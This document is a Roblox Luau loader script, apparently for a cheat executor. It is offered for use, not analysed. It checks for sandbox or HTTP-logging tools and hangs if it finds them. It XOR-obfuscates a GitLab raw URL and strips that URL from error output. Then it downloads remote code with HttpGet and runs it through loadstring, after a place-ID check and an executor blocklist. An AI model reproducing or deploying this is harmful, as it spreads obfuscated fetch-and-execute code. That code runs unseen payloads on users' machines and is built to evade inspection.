
local _, s = pcall(function(...)
     string.byte("a", function(...)
        return; 
     end, 9999, 38);
end)
if s:find("httplog") or s:find("sandbox") then while true do end; end;
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local PCall = pcall
local ToString = tostring
local Warn = warn
local TaskSpawn = task.spawn
local StringByte = string.byte
local StringChar = string.char
local StringGsub = string.gsub
local StringLower = string.lower
local TableConcat = table.concat
local MathFmod = math.fmod
local Bit32Bxor = bit32.bxor
local IPairs = ipairs



local XorDecode
do
    local KEY = "astro"
    local KeyLen = #KEY

    XorDecode = function(Encoded)
        local Chars = {}
        for Index, Byte in IPairs(Encoded) do
            local KeyByte = StringByte(KEY, MathFmod(Index - 1, KeyLen) + 1)
            Chars[Index] = StringChar(Bit32Bxor(Byte, KeyByte))
        end
        return TableConcat(Chars)
    end
end

local ENCODED_URL = (function()
    local Key = "astro"
    local Url = "https://gitlab.com/potanginamo373-lang/flick/-/raw/main/flick.luau"
    local KeyLen = #Key
    local Out = {}
    for Index = 1, #Url do
        local UrlByte = StringByte(Url, Index)
        local KeyByte = StringByte(Key, MathFmod(Index - 1, KeyLen) + 1)
        Out[Index] = Bit32Bxor(UrlByte, KeyByte)
    end
    return Out
end)()

local SCRUB_PATTERNS = {
    "https?://[%w%-%._~:/%?#%[%]@!%$&'%(%)%*%+,;%%=]+",
    "gitlab%.com",
    "potanginamo373%-lang",
    "flick",
    "flick%.luau",
}

local PLACE_IDS = { Expected = 136801880565837 }
local MESSAGES = {
    WrongGame  = "Wrong game FN",
    LoadFailed = "[Loader] Failed to load script",
    RunFailed  = "[Loader] Failed to run script",
}

local BLOCKLIST = {
    ["xx"] = true,  
}

local function SafeWarn(Message)
    local Scrubbed = Message
    for _, Pattern in IPairs(SCRUB_PATTERNS) do
        local Result = StringGsub(Scrubbed, Pattern, "[redacted]")
        Scrubbed = Result
    end
    Warn(Scrubbed)
end

local function SafePCall(Fn, ...)
    local Success, Result = PCall(Fn, ...)
    if not Success then
        local Scrubbed = ToString(Result)
        for _, Pattern in IPairs(SCRUB_PATTERNS) do
            local Out = StringGsub(Scrubbed, Pattern, "[redacted]")
            Scrubbed = Out
        end
        return false, Scrubbed
    end
    return true, Result
end

local function ValidateGame()
    if game.PlaceId ~= PLACE_IDS.Expected then
        Warn("[Loader] Wrong game")
        LocalPlayer:Kick(MESSAGES.WrongGame)
        GUF_CRASH()
        return false
    end
    return true
end

local function GetExecutorName()
    local Fn = identifyexecutor or getexecutorname
    if Fn then
        return Fn()
    end
    return "unknown"
end

local function ValidateExecutor(ExecName)
    local ExecLower = StringLower(ExecName)
    if BLOCKLIST[ExecLower] then
        Warn("[Loader] Executor not supported")
        LocalPlayer:Kick("Your executor is not supported.")
        return false
    end
    return true
end

local function LoadMain()
    local DecodedUrl = XorDecode(ENCODED_URL)

    TaskSpawn(function()
        local Success, Script = SafePCall(function()
            return game:HttpGet(DecodedUrl)
        end)
        if not Success then
            SafeWarn(MESSAGES.LoadFailed)
            return
        end

        local LoadSuccess, Loaded = SafePCall(function()
            return loadstring(Script)
        end)
        if not LoadSuccess then
            SafeWarn(MESSAGES.LoadFailed)
            return
        end

        local RunSuccess, RunResult = SafePCall(Loaded)
        if not RunSuccess then
            SafeWarn(MESSAGES.RunFailed)
        end
    end)

    DecodedUrl = "" 
end

if not ValidateGame() then return end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local ExecName = GetExecutorName()
if not ValidateExecutor(ExecName) then return end

LoadMain()
